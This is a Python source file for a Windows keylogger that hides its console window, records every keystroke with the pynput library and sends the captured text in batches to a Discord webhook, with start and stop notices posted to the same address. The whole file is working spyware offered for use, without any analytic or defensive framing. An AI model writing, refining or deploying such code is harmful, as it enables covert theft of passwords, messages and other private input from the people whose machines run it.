import requests
import time
import os
import platform
import sys
from pynput import keyboard

# Windows-specific imports
try:
    import win32gui
    import win32con
except ImportError:
    pass

WEBHOOK_URL = "Your discord url from integrations"

def is_windows():
    return platform.system() == "Windows"

def hide_console():
    """Hide console window on Windows"""
    if is_windows():
        try:
            import win32console
            import win32gui
            window = win32console.GetConsoleWindow()
            win32gui.ShowWindow(window, 0)
        except:
            pass

class WindowsKeylogger:
    def __init__(self):
        self.captured_keys = ""
        self.last_send_time = time.time()
        
    def on_press(self, key):
        try:
            # Stop on ESC key
            if key == keyboard.Key.esc:
                try:
                    requests.post(WEBHOOK_URL, json={"content": "🛑 Key monitor stopped"})
                except:
                    pass
                return False
            
            # Windows-specific key handling
            if key == keyboard.Key.space:
                self.captured_keys += " "
            elif key == keyboard.Key.enter:
                self.captured_keys += "\n"
            elif key == keyboard.Key.tab:
                self.captured_keys += "[TAB]"
            elif key == keyboard.Key.backspace:
                self.captured_keys += "[BACKSPACE]"
            elif hasattr(key, 'char') and key.char:
                self.captured_keys += key.char
            else:
                # Handle Windows special keys
                if key == keyboard.Key.cmd:
                    self.captured_keys += "[WIN]"
                else:
                    return
            
            # Send logic
            current_time = time.time()
            if len(self.captured_keys) >= 30 or (current_time - self.last_send_time) >= 15:
                if self.captured_keys.strip():
                    try:
                        requests.post(
                            WEBHOOK_URL, 
                            json={"content": f"```{self.captured_keys}```"},
                            timeout=5
                        )
                        self.captured_keys = ""
                    except:
                        pass
                self.last_send_time = current_time
                
        except Exception:
            pass

    def start(self):
        """Start the keylogger with Windows optimizations"""
        if is_windows():
            hide_console()
            
        try:
            requests.post(WEBHOOK_URL, json={"content": "🚀 Windows key monitor started!"}, timeout=10)
        except:
            pass
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    logger = WindowsKeylogger()
    logger.start()
